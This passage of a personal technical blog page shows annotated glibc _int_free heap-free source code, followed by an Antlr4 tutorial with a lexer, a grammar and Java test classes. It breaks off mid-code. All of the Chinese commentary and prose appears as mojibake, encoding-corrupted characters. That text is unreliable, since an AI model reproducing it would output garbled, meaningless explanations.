(top)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp; (<span class="type">char</span> *)nextchunk &gt;= ((<span class="type">char</span> *)av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">    &#123;<span class="comment">//å¦‚æœä¸‹ä¸€ä¸ªå †å—æº¢å‡ºåˆ°topchunkå†…éƒ¨äº†</span></span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk)))</span><br><span class="line">    &#123;<span class="comment">//å¦‚æœç‰©ç†ä¸Šçš„åå—æ²¡æœ‰è®°å½•æœ¬å—çš„é‡Šæ”¾çŠ¶æ€</span></span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);<span class="comment">//ä¸‹ä¸€ä¸ªå †å—çš„å¤§å°</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;<span class="comment">//ä¸‹ä¸€å †å—çš„å¤§å°å¿…é¡»åœ¨åˆæ³•èŒƒå›´(2*SIZE_SZ,av-&gt;system_mem)ä¹‹å†…</span></span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);<span class="comment">//pæ•°æ®åŒºæ¸…é›¶</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))<span class="comment">//å‘å‰åˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)<span class="comment">//å¦‚æœåå—æ—¶topchunkåˆ™åˆå¹¶åˆ°topchunk,å¦åˆ™å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse)<span class="comment">//å¦‚æœåä¸€å †å—ç©ºé—²åˆ™å‘ååˆå¹¶</span></span><br><span class="line">      &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">  Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">  not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">  been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);<span class="comment">//é‡Šæ”¾çš„å †å—æ”¾åˆ°unsortedbinä¸­,ä¸‹ä¸€æ¬¡mallocæ‰å¯èƒ½é‡æ–°å®‰æ’æ–°å»å¤„</span></span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))<span class="comment">//å¦‚æœæ˜¯largebinçš„å †å—åˆ™ç°åœ¨å°±æŠŠfd_nextsizeå’Œbk_nextsizeæ¸…é›¶</span></span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span><span class="comment">//æ­¤elseæ„å‘³ç€å‘åä¸topchunkç›¸é‚»,åˆ™åˆå¹¶åˆ°topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD)</span><br><span class="line">    &#123;<span class="comment">//å¦‚æœsizeå¤§äºfastbinåˆå¹¶é˜ˆå€¼65536</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);<span class="comment">//æ¸…ç©ºfastbin,è¯¥åˆå¹¶åˆå¹¶,æ”¾åˆ°unsortedbinæˆ–è€…topchunk</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena)<span class="comment">//å¦‚æœæ˜¯ä¸»åˆ†é…åŒº</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))<span class="comment">//å¦‚æœtopchunkå¤ªå¤§äº†å°±å¾—ä¿®å‰ªä¸€ä¸‹</span></span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//å¦åˆ™å°±æ˜¯éä¸»åˆ†é…åŒºçš„è¾…åŠ©å †</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">      assert(locked);<span class="comment">//ä¿è¯äº‹åŠ¡å®Œæ•´æ€§</span></span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="mmapæ˜ å°„åŒºé‡Šæ”¾"><a href="#mmapæ˜ å°„åŒºé‡Šæ”¾" class="headerlink" title="mmapæ˜ å°„åŒºé‡Šæ”¾"></a>mmapæ˜ å°„åŒºé‡Šæ”¾</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  munmap_chunk(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/05/31/Antlr/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/31/Antlr/" class="post-title-link" itemprop="url">Antlr4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-05-31 22:31:00" itemprop="dateCreated datePublished" datetime="2023-05-31T22:31:00+08:00">2023-05-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-04-24 22:10:17" itemprop="dateModified" datetime="2024-04-24T22:10:17+08:00">2024-04-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Antlr4"><a href="#Antlr4" class="headerlink" title="Antlr4"></a>Antlr4</h1><p>é¡¹ç›®åœ°å€<a target="_blank" rel="noopener" href="https://github.com/DeutschBall/Interpreter-Antlr">DeutschBall&#x2F;Interpreter-Antlr: Antlrå®ç°çš„å‡½æ•°ç»˜å›¾è¯­è¨€è§£é‡Šå™¨ (github.com)</a></p>
<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">antlr Hello.g4</span><br></pre></td></tr></table></figure>

<p>è¿™ç§ç”Ÿæˆå‘½ä»¤,å®é™…ä¸Šè¿™é‡Œçš„antlræ‰§è¡Œçš„å‘½ä»¤æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java org.antlr.v4.Tool ./Hello.g4</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´,org.antlr.v4.Toolåº”è¯¥æ˜¯åœ¨CLASSPATHä¸­çš„</p>
<p>åœ¨windowsä¸­éœ€è¦åœ¨å˜é‡CLASSPATHä¸­åŠ ä¸ŠjaråŒ…çš„åœ°å€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230524151158485.png" alt="image-20230524151158485"></p>
<p>ä»»ä½•ä¸€ä¸ªAntlræºæ–‡ä»¶,æ¯”å¦‚Hello.g4,å¦‚æœè¯­æ³•æ²¡æœ‰é”™è¯¯,æ‰§è¡Œantlr4 Hello.g4ä¹‹å,éƒ½ä¼šç”Ÿæˆå…­ä¸ªæ–‡ä»¶</p>
<table>
<thead>
<tr>
<th>æ–‡ä»¶</th>
<th>ä½œç”¨</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>HelloParser.java</td>
<td>ä¸æƒ³å†™</td>
<td></td>
</tr>
<tr>
<td>HelloLexer.java</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Hello.tokens</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HelloLexer.tokens</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HelloListener.java</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HelloBaseListener.java</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="è¯æ³•åˆ†æå™¨"><a href="#è¯æ³•åˆ†æå™¨" class="headerlink" title="è¯æ³•åˆ†æå™¨"></a>è¯æ³•åˆ†æå™¨</h2><p>è¯æ³•åˆ†æå™¨å®ç°,ç»§æ‰¿è‡ªorg.antlr.v4.runtime.Lexer</p>
<p>è¿™ä¸ªç±»å¹²äº†å•¥å‘¢?</p>
<p>é¦–å…ˆ,<code>*Lexer.java</code>æ–‡ä»¶ä¸­æ˜¯æ²¡æœ‰mainå‡½æ•°çš„,è¿™å°±æ„å‘³ç€,è¿™ä¸ªç±»åªèƒ½ä½œä¸ºå…¶ä»–ç±»çš„ç»„æˆ,æˆ–è€…è¢«å…¶ä»–å‡½æ•°è°ƒç”¨</p>
<p>ä»åå­—ä¸Šçœ‹,è¿™ä¸ªç±»åº”è¯¥å¾—æœ‰ä¸€ä¸ªDFA,ä¸ç®¡æ˜¯è¡¨é©±åŠ¨çš„è¿˜æ˜¯æœ‰å‘å›¾é©±åŠ¨çš„è¿˜æ˜¯ç¡¬ç¼–ç çš„,å¾—æœ‰ä¸€ä¸ªè¾“å…¥,ç„¶åä»è¾“å…¥ä¸­è·å–ç¬¦å·æµ,ç„¶ååœ¨DFAä¸Šè¿›è¡ŒçŠ¶æ€è½¬ç§»,æ¯æ¬¡è°ƒç”¨å®ƒ,éƒ½åº”è¿”å›ä¸€ä¸ªè¯†åˆ«å‡ºçš„è®°å·token</p>
<p>ä¸¾ä¸ªä¾‹å­,ç»Ÿè®¡å•è¯æ•°é‡</p>
<p>antlrè¯­æ³•è§„åˆ™æ–‡ä»¶è¿™æ ·å†™:</p>
<p><code>Counter.g4</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lexer grammar Counter;</span><br><span class="line"></span><br><span class="line">WORD: [a-zA-Z0-9]+;</span><br><span class="line">SPACE: [ \t\n\r]-&gt;skip;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œå‘½ä»¤<code>antlr4 ./Counter.g4</code></p>
<p>ç”±äºg4æ–‡ä»¶ä¸­åªå®šä¹‰äº†è¯æ³•è§„åˆ™ lexer grammer,å› æ­¤åªä¼šç”Ÿæˆè¯æ³•åˆ†æå™¨ç›¸å…³çš„æ–‡ä»¶</p>
<table>
<thead>
<tr>
<th>æ–‡ä»¶</th>
<th>ä½œç”¨</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Counter.interp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Counter.java</td>
<td>è¯æ³•åˆ†æå™¨ç±»</td>
<td></td>
</tr>
<tr>
<td>Counter.tokens</td>
<td>å®šä¹‰ç¬¦å·ä¸åˆ°æ•´æ•°çš„æ˜ å°„</td>
<td></td>
</tr>
</tbody></table>
<p>ç”Ÿæˆä¸€å †æ–‡ä»¶,å…¶ä¸­å°±åŒ…æ‹¬Counter.java,ä¹Ÿå°±æ˜¯è¯æ³•åˆ†æå™¨æ–‡ä»¶</p>
<p>è¿™é‡Œé¢å°±ä¸€ä¸ªCounterç±»,å®ƒå¹²äº†å•¥å‘¢?</p>
<p>æœ€ä¸»è¦çš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">_serializedATN</span> <span class="operator">=</span></span><br><span class="line">	<span class="string">&quot;\3\u608b\ua72a\u8133\ub9ed\u417c\u3be7\u7786\u5964\2\4\20\b\1\4\2\t\2&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\4\3\t\3\3\2\6\2\t\n\2\r\2\16\2\n\3\3\3\3\3\3\3\3\2\2\4\3\3\5\4\3\2\4&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\5\2\62;C\\c|\5\2\13\f\17\17\&quot;\&quot;\2\20\2\3\3\2\2\2\2\5\3\2\2\2\3\b\3\2&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\2\2\5\f\3\2\2\2\7\t\t\2\2\2\b\7\3\2\2\2\t\n\3\2\2\2\n\b\3\2\2\2\n\13&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\3\2\2\2\13\4\3\2\2\2\f\r\t\3\2\2\r\16\3\2\2\2\16\17\b\3\2\2\17\6\3\2&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\2\2\4\2\n\3\b\2\2&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ATN</span> <span class="variable">_ATN</span> <span class="operator">=</span></span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ATNDeserializer</span>().deserialize(_serializedATN.toCharArray());</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">	_decisionToDFA = <span class="keyword">new</span> <span class="title class_">DFA</span>[_ATN.getNumberOfDecisions()];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _ATN.getNumberOfDecisions(); i++) &#123;</span><br><span class="line">		_decisionToDFA[i] = <span class="keyword">new</span> <span class="title class_">DFA</span>(_ATN.getDecisionState(i), i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æœ‰ä¸€ä¸ªç¡¬ç¼–ç çš„staticå­—ç¬¦ä¸²,å…¶ä¸­å­˜æ”¾äº†åºåˆ—åŒ–çš„ATN,ATNæ˜¯å•¥?çŠ¶æ€è½¬ç§»ç½‘ç»œ</p>
<p>è¿™é‡Œ_ATNè¿™ä¸ªstaticæˆå‘˜åœ¨æœ¬ç±»çš„åŠ è½½æ—¶,å°±ä¼šååºåˆ—åŒ–_serializedATN,å»ºç«‹ATNç½‘ç»œ,</p>
<p>ç„¶åstaticé™æ€ä»£ç å—ä¸­,ä»¥ATNç½‘ç»œä¸ºåŸºç¡€å»ºç«‹äº†DFA</p>
<p>è‡³äºè¿™ä¸ªåºåˆ—åŒ–ATNå­—ç¬¦ä¸²ä»€ä¹ˆå«ä¹‰,æˆ‘ä¸æƒ³ç ”ç©¶,ç›¸å½“äºç¡¬ç¼–ç çš„DFA</p>
<p>æœ¬ç±»ä¸­å®³ä¿å­˜äº†ç¬¦å·åç§°,æ¯”å¦‚WORD,SPACE</p>
<p>æœ¬ç±»ä»org.antlr.v4.runtime.LexeråŸºç±»ä¸­ç»§æ‰¿äº†nextTokenç­‰å‡½æ•°,nextTokenå‡½æ•°æ¯æ¬¡è¢«è°ƒç”¨ä¼šè¯†åˆ«ä¸€ä¸ªç¬¦å·</p>
<p>å¦‚ä½•ä½¿ç”¨è¯¥ç±»å‘¢?</p>
<p>å¯ä»¥å†™ä¸€ä¸ªæµ‹è¯•ç±»TestLexer.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.*;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.CharStreams;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.Token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLexer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> cnt_words=<span class="number">0</span>;</span><br><span class="line">        <span class="type">CharStream</span> <span class="variable">input</span> <span class="operator">=</span> CharStreams.fromString(<span class="string">&quot;public static void main&quot;</span>);</span><br><span class="line">        Counter lexer=<span class="keyword">new</span> <span class="title class_">Counter</span>(input);</span><br><span class="line">        Token token;</span><br><span class="line">        <span class="keyword">while</span>((token=lexer.nextToken()).getType()!=Token.EOF)&#123;</span><br><span class="line">            String tokenName=Counter.VOCABULARY.getSymbolicName(token.getType());</span><br><span class="line">            String tokenText=token.getText();</span><br><span class="line">            System.out.printf(<span class="string">&quot;%s: %s%n&quot;</span>,tokenName,tokenText);</span><br><span class="line">            <span class="keyword">if</span>(tokenName==<span class="string">&quot;WORD&quot;</span>)&#123;</span><br><span class="line">                ++cnt_words;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;total words=&quot;</span>+cnt_words);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä»å­—ç¬¦ä¸²â€public static void mainâ€åˆ›å»ºä¸€ä¸ªå­—ç¬¦è¾“å…¥æµ,ç„¶åå°†è¿™ä¸ªæµä½œä¸ºCounter lexerçš„è¾“å…¥</p>
<p>æ­¤åæ¯æ¬¡è°ƒç”¨lexer.nextToken(),lexeréƒ½ä¼šå°è¯•ä»è¯¥å­—ç¬¦è¾“å…¥æµä¸­è·å–ä¸€ä¸ªç¬¦å·,ç¬¦å·çš„ç±»å‹æ˜¯org.antlr.v4.runtime.Token</p>
<h2 id="è¯­æ³•åˆ†æå™¨"><a href="#è¯­æ³•åˆ†æå™¨" class="headerlink" title="è¯­æ³•åˆ†æå™¨"></a>è¯­æ³•åˆ†æå™¨</h2><p>ä»¥è®¡ç®—å™¨ä¸ºä¾‹</p>
<p>Calculator.g4</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">grammar Calculator;</span><br><span class="line"><span class="comment">// import LexerRule;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯­æ³•å®šä¹‰</span></span><br><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      </span><br><span class="line">|ID <span class="string">&#x27;=&#x27;</span> expr NEWLINE    </span><br><span class="line">|NEWLINE                </span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">expr: expr (<span class="string">&#x27;*&#x27;</span>|<span class="string">&#x27;/&#x27;</span>) expr   </span><br><span class="line">|expr (<span class="string">&#x27;+&#x27;</span>|<span class="string">&#x27;-&#x27;</span>) expr        </span><br><span class="line">|INT                        </span><br><span class="line">|ID                         </span><br><span class="line">|<span class="string">&#x27;(&#x27;</span> expr <span class="string">&#x27;)&#x27;</span>               </span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ID: [a-zA-Z]+;</span><br><span class="line">INT:[<span class="number">0</span>-<span class="number">9</span>]+;</span><br><span class="line">WS:[ \t\n]+ -&gt;skip;<span class="comment">//å¤šä½™çš„ç©ºæ ¼å›è½¦å¿½ç•¥</span></span><br><span class="line">NEWLINE: <span class="string">&#x27;\r&#x27;</span>? <span class="string">&#x27;\n&#x27;</span>;<span class="comment">//\r\næ˜¯winä¸Šçš„æ¢è¡Œç¬¦,\ræ˜¯linuxä¸Šçš„æ¢è¡Œ</span></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå‘½ä»¤<code>antlr4 ./Calculator.g4</code>ä¹‹å,ä¼šåœ¨æœ¬ç›®å½•ä¸‹ç”Ÿæˆ</p>
<table>
<thead>
<tr>
<th>æ–‡ä»¶</th>
<th>ä½œç”¨</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>CalculatorLexer.java</td>
<td>è¯æ³•åˆ†æå™¨ç±»</td>
<td></td>
</tr>
<tr>
<td>CalculatorParser.java</td>
<td>è¯­æ³•åˆ†æå™¨ç±»</td>
<td></td>
</tr>
<tr>
<td>CalculatorListener.java</td>
<td>ç›‘å¬å™¨æ¥å£</td>
<td></td>
</tr>
<tr>
<td>Calculator.BaseListener.java</td>
<td>ç›‘å¬å™¨åŸºç±»</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>å†™ä¸€ä¸ªæµ‹è¯•ç±»Test,æµ‹è¯•è¯­æ³•åˆ†æå™¨çš„ä½œç”¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.antlr.runtime.ANTLRInputStream;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.*;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.CharStreams;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.Token;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.tree.*;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.tool.ANTLRToolListener;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String inputFile=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            inputFile=args[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        CharStream input=<span class="literal">null</span>;</span><br><span class="line">        InputStream is=System.in;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(inputFile!=<span class="literal">null</span>)&#123;</span><br><span class="line">                is=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(inputFile);</span><br><span class="line">            &#125;</span><br><span class="line">            input=CharStreams.fromStream(is);</span><br><span 